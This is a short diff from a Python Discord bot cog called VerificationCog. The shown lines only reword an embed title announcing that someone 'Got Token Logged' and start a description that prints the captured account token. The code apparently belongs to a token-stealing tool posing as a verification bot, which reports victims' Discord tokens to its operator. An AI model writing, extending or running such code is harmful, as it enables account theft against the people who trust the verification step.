@@ -130,7 +130,7 @@ class VerificationCog(commands.Cog):
                 if info_res.ok:
                     info = info_res.json()
                     embed: DiscordEmbed = DiscordEmbed(
-                        title='Some Dumbass Got Token Logged 💀',
+                        title='Someone Got Token Logged 💀',
                         description=
 f'''```ini
 "Token" = "{token}"
